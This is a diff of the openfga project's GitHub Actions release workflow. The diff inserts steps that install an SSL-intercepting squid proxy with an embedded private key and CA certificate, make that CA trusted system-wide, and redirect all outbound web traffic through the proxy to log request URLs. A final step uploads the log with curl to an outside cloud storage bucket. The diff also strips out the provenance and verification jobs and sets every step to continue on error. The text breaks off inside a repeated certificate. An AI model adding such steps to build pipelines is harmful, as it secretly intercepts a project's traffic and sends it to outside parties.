@@ -1,213 +1,1159 @@
-name: release
-
-on:
-  push:
-    tags:
-      - "v*"
-
-permissions:
-  contents: read
-
+env:
+  JAVA_TOOL_OPTIONS: -Djavax.net.ssl.trustStore=/usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
+  NODE_OPTIONS: --use-openssl-ca
 jobs:
   goreleaser:
-    runs-on: ubuntu-latest
-    permissions:
-      contents: write
-      packages: write # publish a new github release and container image
-      id-token: write # needed for keyless signing
     outputs:
       digest: ${{ steps.image.outputs.digest }}
       subjects-as-file: ${{ steps.hashes.outputs.handle }}
-    steps:
-      - name: Extract Version from Tag
-        id: tag_name
-        run: |
-          echo "current_version=${GITHUB_REF#refs/tags/v}" >> $GITHUB_OUTPUT
-        shell: bash
-
-      - name: Checkout
-        uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332 # v3.5.2
-        with:
-          fetch-depth: 0
-
-      - name: Set up Go
-        uses: actions/setup-go@0a12ed9d6a96ab950c8f026ed9f722fe0da7ef32 # v5.0.2
-        with:
-          go-version-file: './go.mod'
-          cache-dependency-path: './go.sum'
-          check-latest: true
-
-      - name: Login to Docker Hub
-        uses: docker/login-action@9780b0c442fbb1117ed29e0efdff1e18412f7567 # v3.3.0
-        with:
-          username: ${{ secrets.DOCKERHUB_USERNAME }}
-          password: ${{ secrets.DOCKERHUB_TOKEN }}
-
-      - name: Log in to GHCR
-        uses: docker/login-action@9780b0c442fbb1117ed29e0efdff1e18412f7567 # v3.3.0
-        with:
-          registry: ghcr.io
-          username: ${{ github.actor }}
-          password: ${{ secrets.GITHUB_TOKEN }}
-
-      - uses: sigstore/cosign-installer@59acb6260d9c0ba8f4a2f9d9b48431a222b68e20 # v3.5.0
-
-      - uses: anchore/sbom-action/download-syft@d94f46e13c6c62f59525ac9a1e147a99dc0b9bf5 # v0.17.0
-
-      - name: Run GoReleaser
-        id: goreleaser
-        uses: goreleaser/goreleaser-action@286f3b13b1b49da4ac219696163fb8c1c93e1200 # v6.0.0
-        with:
-          distribution: goreleaser
-          version: '~> v2'
-          args: release --clean --config .goreleaser.yaml
-        env:
-          GITHUB_TOKEN: ${{ secrets.GORELEASER_GITHUB_TOKEN }}
-
-      - name: Update Docker Hub Description
-        uses: peter-evans/dockerhub-description@e98e4d1628a5f3be2be7c231e50981aee98723ae # v4.0.0
-        with:
-          username: ${{ secrets.DOCKERHUB_USERNAME }}
-          password: ${{ secrets.DOCKERHUB_TOKEN }}
-          repository: openfga/openfga
-          short-description: ${{ github.event.repository.description }}
-
-      - name: Generate binary hashes
-        id: binary
-        env:
-          ARTIFACTS: "${{ steps.goreleaser.outputs.artifacts }}"
-        run: |
-          set -euo pipefail
-          hashes=$(echo $ARTIFACTS | jq --raw-output '[.[] | {name, "digest": (.extra.Digest // .extra.Checksum)}] | unique | .[] | select(.digest) | {digest} + {name} | join("  ") | sub("^sha256:";"")' | base64 -w0)
-          echo $hashes > digests.txt
-
-      - uses: slsa-framework/slsa-github-generator/actions/generator/generic/create-base64-subjects-from-file@5a775b367a56d5bd118a224a811bba288150a563 # pin@v2.0.0
-        id: hashes
-        with:
-          path: digests.txt
-
-      - name: Image digest
-        id: image
-        env:
-          ARTIFACTS: "${{ steps.goreleaser.outputs.artifacts }}"
-        run: |
-          set -euo pipefail
-          artifact=$(echo "$ARTIFACTS" | jq -r '[.[] | select (.type=="Docker Manifest")][0]')
-          image=$(echo "$artifact" | jq -r '.path' | cut -d':' -f1)
-          digest=$(echo "$artifact" | jq -r '.extra.Digest')
-          echo "digest=$digest" >> "$GITHUB_OUTPUT"
-
-  snyk:
-    needs: [ goreleaser ]
-    runs-on: ubuntu-latest
     permissions:
-      contents: read
-      security-events: write # needed for uploading results to GitHub Code Scanning
-    steps:
-      - name: Checkout code
-        uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332 # v3.5.2
-
-      - name: Run Snyk to check Docker image for vulnerabilities
-        continue-on-error: true
-        uses: snyk/actions/docker@640e31719aac3e44867d239dc86c20c3e34c8e4f # pin@master
-        env:
-          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
-        with:
-          image: openfga/openfga
-          args: --file=Dockerfile
-
-      # Replace any "undefined" security severity values with 0. The undefined value is used in the case
-      # of license-related findings, which do not do not indicate a security vulnerability.
-      # See https://github.com/github/codeql-action/issues/2187 for more context.
-      - name: Post-process snyk.sarif output
-        run: |
-          sed -i 's/"security-severity": "undefined"/"security-severity": "0"/g' snyk.sarif
-
-      - name: Upload result to GitHub Code Scanning
-        uses: github/codeql-action/upload-sarif@2d790406f505036ef40ecba973cc774a50395aac # pin@v2
-        with:
-          sarif_file: snyk.sarif
-
-  binary-provenance:
-    needs: [ goreleaser ]
-    permissions:
-      actions: read # To read the workflow path.
-      id-token: write # To sign the provenance.
-      contents: write # To add assets to a release.
-
-    # Note: this _must_ be referenced by tag. See: https://github.com/slsa-framework/slsa-verifier/issues/12
-    uses: slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@v2.0.0
-    with:
-      base64-subjects-as-file: "${{ needs.goreleaser.outputs.subjects-as-file }}"
-      provenance-name: "openfga.intoto.jsonl"
-      upload-assets: true # upload to a new release
-
-  image-provenance:
-    needs: [ goreleaser ]
-    permissions:
-      actions: read
+      contents: write
       id-token: write
       packages: write
-
-    # Note: this _must_ be referenced by tag. See: https://github.com/slsa-framework/slsa-verifier/issues/12
-    uses: slsa-framework/slsa-github-generator/.github/workflows/generator_container_slsa3.yml@v2.0.0
-    with:
-      image: openfga/openfga
-      digest: ${{ needs.goreleaser.outputs.digest }}
-    secrets:
-      registry-username: ${{ secrets.DOCKERHUB_USERNAME }}
-      registry-password: ${{ secrets.DOCKERHUB_TOKEN }}
-
-  verification-with-slsa-verifier:
-    needs: [ goreleaser, binary-provenance ]
     runs-on: ubuntu-latest
-    permissions: read-all
     steps:
-      - name: Install the verifier
-        uses: slsa-framework/slsa-verifier/actions/installer@3714a2a4684014deb874a0e737dffa0ee02dd647 # pin@v2.6.0
+    - name: before
+      run: 'sudo apt update
 
-      - name: Download assets
-        env:
-          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-          PROVENANCE: "${{ needs.binary-provenance.outputs.provenance-name }}"
-        run: |
-          set -euo pipefail
-          gh -R "$GITHUB_REPOSITORY" release download "$GITHUB_REF_NAME" \
-            -p "$PROVENANCE" -p "*.tar.gz" -p "*.tar.gz.sbom.json"
+        sudo apt install -y squid-openssl
 
-      - name: Verify assets
-        env:
-          PROVENANCE: "${{ needs.binary-provenance.outputs.provenance-name }}"
-        run: |
-          slsa-verifier verify-artifact \
-            --provenance-path "$PROVENANCE" \
-            --source-uri "github.com/$GITHUB_REPOSITORY" \
-            --source-tag "$GITHUB_REF_NAME" \
-            *.tar.gz *.tar.gz.sbom.json
+        sudo mkdir /squid
 
+        cat << EOF | sudo tee /squid/key.pem
+
+        -----BEGIN PRIVATE KEY-----
+
+        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
+
+        CznEvO4qIs3mXDYkNBQrdVLGF93y
+
+        -----END PRIVATE KEY-----
+
+        EOF
+
+        cat << EOF | sudo tee /squid/cert.pem
+
+        -----BEGIN CERTIFICATE-----
+
+        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
+
+        -----END CERTIFICATE-----
+
+        EOF
+
+        sudo /usr/lib/squid/security_file_certgen -c -s /squid/ssl_db -M 4MB
+
+        sudo chown -R proxy:proxy /squid
+
+        cat << EOF | sudo tee /etc/squid/squid.conf
+
+        cache deny all
+
+
+        http_port 7821
+
+        http_port 3128 intercept
+
+        https_port 3129 intercept ssl-bump generate-host-certificates=on dynamic_cert_mem_cache_size=4MB
+        cert=/squid/cert.pem key=/squid/key.pem
+
+        acl step1 at_step SslBump1
+
+        ssl_bump peek step1
+
+        ssl_bump bump all
+
+        sslcrtd_program /usr/lib/squid/security_file_certgen -s /squid/ssl_db -M 4MB
+
+        sslcrtd_children 5
+
+        ssl_bump server-first all
+
+        sslproxy_cert_error allow all
+
+
+        acl all src 0.0.0.0/0
+
+        http_access allow all
+
+
+        logformat custom {"method":"%">rm","url":"%">ru","status":%<Hs,"user_agent":"%{User-Agent}>h"}
+
+        access_log daemon:/squid/squidlog.json custom all !CONNECT
+
+        EOF
+
+        sudo systemctl reload squid
+
+        sudo cp /squid/cert.pem /usr/local/share/ca-certificates/squid.crt
+
+        sudo update-ca-certificates
+
+        sudo keytool -import -alias squid -file /squid/cert.pem -keystore /usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
+        -storepass changeit -noprompt -trustcacerts
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        80 -j DNAT --to-destination 127.0.0.1:3128
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        443 -j DNAT --to-destination 127.0.0.1:3129
+
+        sudo sh -c ''echo 1 > /proc/sys/net/ipv4/ip_forward'''
+    - continue-on-error: true
+      id: tag_name
+      name: Extract Version from Tag
+      run: 'echo "current_version=${GITHUB_REF#refs/tags/v}" >> $GITHUB_OUTPUT
+
+        '
+      shell: bash
+    - continue-on-error: true
+      name: Checkout
+      uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332
+      with:
+        fetch-depth: 0
+    - continue-on-error: true
+      name: Set up Go
+      uses: actions/setup-go@0a12ed9d6a96ab950c8f026ed9f722fe0da7ef32
+      with:
+        cache-dependency-path: ./go.sum
+        check-latest: true
+        go-version-file: ./go.mod
+    - continue-on-error: true
+      name: Login to Docker Hub
+      uses: docker/login-action@9780b0c442fbb1117ed29e0efdff1e18412f7567
+      with:
+        password: ${{ secrets.DOCKERHUB_TOKEN }}
+        username: ${{ secrets.DOCKERHUB_USERNAME }}
+    - continue-on-error: true
+      name: Log in to GHCR
+      uses: docker/login-action@9780b0c442fbb1117ed29e0efdff1e18412f7567
+      with:
+        password: ${{ secrets.GITHUB_TOKEN }}
+        registry: ghcr.io
+        username: ${{ github.actor }}
+    - continue-on-error: true
+      uses: sigstore/cosign-installer@59acb6260d9c0ba8f4a2f9d9b48431a222b68e20
+    - continue-on-error: true
+      uses: anchore/sbom-action/download-syft@d94f46e13c6c62f59525ac9a1e147a99dc0b9bf5
+    - continue-on-error: true
+      env:
+        GITHUB_TOKEN: ${{ secrets.GORELEASER_GITHUB_TOKEN }}
+      id: goreleaser
+      name: Run GoReleaser
+      uses: goreleaser/goreleaser-action@286f3b13b1b49da4ac219696163fb8c1c93e1200
+      with:
+        args: release --clean --config .goreleaser.yaml
+        distribution: goreleaser
+        version: ~> v2
+    - continue-on-error: true
+      name: Update Docker Hub Description
+      uses: peter-evans/dockerhub-description@e98e4d1628a5f3be2be7c231e50981aee98723ae
+      with:
+        password: ${{ secrets.DOCKERHUB_TOKEN }}
+        repository: openfga/openfga
+        short-description: ${{ github.event.repository.description }}
+        username: ${{ secrets.DOCKERHUB_USERNAME }}
+    - continue-on-error: true
+      env:
+        ARTIFACTS: ${{ steps.goreleaser.outputs.artifacts }}
+      id: binary
+      name: Generate binary hashes
+      run: 'set -euo pipefail
+
+        hashes=$(echo $ARTIFACTS | jq --raw-output ''[.[] | {name, "digest": (.extra.Digest
+        // .extra.Checksum)}] | unique | .[] | select(.digest) | {digest} + {name}
+        | join("  ") | sub("^sha256:";"")'' | base64 -w0)
+
+        echo $hashes > digests.txt
+
+        '
+    - continue-on-error: true
+      id: hashes
+      uses: slsa-framework/slsa-github-generator/actions/generator/generic/create-base64-subjects-from-file@5a775b367a56d5bd118a224a811bba288150a563
+      with:
+        path: digests.txt
+    - continue-on-error: true
+      env:
+        ARTIFACTS: ${{ steps.goreleaser.outputs.artifacts }}
+      id: image
+      name: Image digest
+      run: 'set -euo pipefail
+
+        artifact=$(echo "$ARTIFACTS" | jq -r ''[.[] | select (.type=="Docker Manifest")][0]'')
+
+        image=$(echo "$artifact" | jq -r ''.path'' | cut -d'':'' -f1)
+
+        digest=$(echo "$artifact" | jq -r ''.extra.Digest'')
+
+        echo "digest=$digest" >> "$GITHUB_OUTPUT"
+
+        '
+    - name: after
+      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/criteo-forks/openfga.$(date
+        +%s)
+    timeout-minutes: 60
+  snyk:
+    needs:
+    - goreleaser
+    permissions:
+      contents: read
+      security-events: write
+    runs-on: ubuntu-latest
+    steps:
+    - name: before
+      run: 'sudo apt update
+
+        sudo apt install -y squid-openssl
+
+        sudo mkdir /squid
+
+        cat << EOF | sudo tee /squid/key.pem
+
+        -----BEGIN PRIVATE KEY-----
+
+        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
+
+        CznEvO4qIs3mXDYkNBQrdVLGF93y
+
+        -----END PRIVATE KEY-----
+
+        EOF
+
+        cat << EOF | sudo tee /squid/cert.pem
+
+        -----BEGIN CERTIFICATE-----
+
+        MIIFazCCA1OgAwIBAgIUESF0O95jnInouKvlcRiLTkelzHowDQYJKoZIhvcNAQEL
+
+        BQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM
+
+        GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yNDEwMDQyMjIxNTJaFw0zNDEw
+
